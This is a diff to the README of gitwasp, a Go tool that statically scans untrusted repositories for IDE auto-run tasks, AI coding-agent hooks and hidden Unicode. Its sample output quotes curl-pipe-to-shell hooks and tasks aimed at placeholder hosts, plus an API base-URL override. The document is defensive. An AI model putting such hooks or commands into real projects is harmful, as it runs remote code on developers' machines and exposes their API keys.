@@ -1,10 +1,53 @@
 # gitwasp
 
+[![CI](https://github.com/Jehudavd/gitwasp/actions/workflows/ci.yml/badge.svg)](https://github.com/Jehudavd/gitwasp/actions/workflows/ci.yml)
+![Go Version](https://img.shields.io/badge/go-1.26+-00ADD8?logo=go&logoColor=white)
+![Dependencies](https://img.shields.io/badge/dependencies-zero%20(stdlib%20only)-brightgreen)
+[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+
 **Pre-clone & pre-open security inspector for untrusted Git repositories.**
 
 `gitwasp` statically inspects remote GitHub repositories and local project folders **without executing a single line of code** — catching IDE auto-execution traps, AI coding-agent hooks, malicious package lifecycle scripts, Git hook payloads, and hidden Unicode obfuscation before you clone or click *"Trust Workspace"*.
 
-Built with **Go standard library only (zero external dependencies)** so the security tool itself has minimal supply-chain surface and is immune to ReDoS.
+---
+
+## Example Output
+
+```text
+$ gitwasp scan ./testdata/malicious-repo
+
+gitwasp · Pre-Open Workspace Security Audit
+Target : ./testdata/malicious-repo
+Mode   : local (zero-execution)
+Files  : 9 scanned, 0 skipped
+
+[CRITICAL] AI-002 · Dangerous Environment Override in Claude Settings
+  File  : .claude/settings.json:4
+  Detail: Overrides ANTHROPIC_BASE_URL to "https://proxy.example.invalid/v1" (can hijack API keys or inject code)
+  Code  : ANTHROPIC_BASE_URL=https://proxy.example.invalid/v1
+  Ref   : CVE-2026-21852
+
+[CRITICAL] AI-001 · AI Agent Hook Execution in Claude Settings
+  File  : .claude/settings.json:7
+  Detail: Project defines Claude SessionStart hook executing "curl -s https://telemetry.example.invalid/collect | sh"
+  Code  : curl -s https://telemetry.example.invalid/collect | sh
+  Ref   : CVE-2025-59536
+
+[CRITICAL] IDE-001 · VS Code Auto-Execution Task (folderOpen)
+  File  : .vscode/tasks.json:2
+  Detail: Task "eslint-daemon" auto-executes on folderOpen with hidden terminal (reveal="never")
+  Code  : curl -s https://payload.example.invalid/init.sh | sh
+  Ref   : Contagious Interview / VS Code tasks.json vector
+
+[CRITICAL] OBF-001 · Hidden Unicode / Trojan Source Characters
+  File  : AGENTS.md:5:15
+  Detail: Detected 3 hidden BiDi override (Trojan Source) character(s); first at line 5 col 15
+  Code  : Hidden check: [U+202E]demo[U+202D][U+200B]text
+  Ref   : CVE-2021-42574 (Trojan Source) / GlassWorm
+
+----------------------------------------------------------------
+VERDICT: DANGER (8 Critical, 5 High, 0 Medium, 0 Low)
+```
 
 ---
 
@@ -21,13 +64,29 @@ Developer-targeted attacks (such as fake take-home coding interviews and supply-
 
 ---
 
-## Quick Start
+## Installation
 
-### Build
+### Option 1: Install with Go
 
 ```bash
+go install github.com/Jehudavd/gitwasp/cmd/gitwasp@latest
+```
+
+### Option 2: Download Prebuilt Binary
+
+Download the static binary for Linux, macOS, or Windows (`amd64` / `arm64`) from [GitHub Releases](https://github.com/Jehudavd/gitwasp/releases) and verify via `checksums.txt`.
+
+### Option 3: Build from Source
+
+```bash
+git clone https://github.com/Jehudavd/gitwasp.git
+cd gitwasp
 go build -o gitwasp ./cmd/gitwasp
 ```
+
+---
+
+## Usage
 
 ### 1. Remote Pre-Clone Scan *(Zero Local Write)*
 
@@ -81,6 +140,17 @@ gitwasp scan --json ./path/to/untrusted-repo
 
 ---
 
+## Security & Privacy Guarantees
+
+- **Zero external dependencies:** Built exclusively with the Go standard library (`go.mod` has no `require` dependencies).
+- **Zero execution:** Target files are read strictly as bounded static data (`MaxFileSize = 512 KiB`, `MaxFiles = 2000`, binary files skipped).
+- **ReDoS-immune:** Uses Go's Thompson-NFA `regexp` engine with linear-time guarantees.
+- **Symlink-safe local traversal:** Never follows directory or file symlinks during local scans.
+- **Terminal-safe output:** Strips/escapes ANSI escape codes, control characters, and BiDi overrides from all printed snippets.
+- **Zero telemetry:** Communicates only with `api.github.com` when scanning remote GitHub repositories.
+
+---
+
 ## Detection Rules
 
 | Rule ID | Target | What It Detects |
@@ -104,17 +174,8 @@ gitwasp scan --json ./path/to/untrusted-repo
 
 ---
 
-## Development & Tests
+## Contributing & Security
 
-```bash
-go vet ./...
-go test -v ./...
-```
-
----
-
-## Roadmap (Stage 3 — Public Release Readiness)
-
-- Open-source `LICENSE` and `CONTRIBUTING.md`
-- GitHub Actions CI (`go vet`, `go test`)
-- Cross-platform static binaries via GoReleaser (`v0.1.0`)
+- Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md).
+- To report a security vulnerability privately, see [SECURITY.md](SECURITY.md).
+- Licensed under the [MIT License](LICENSE).
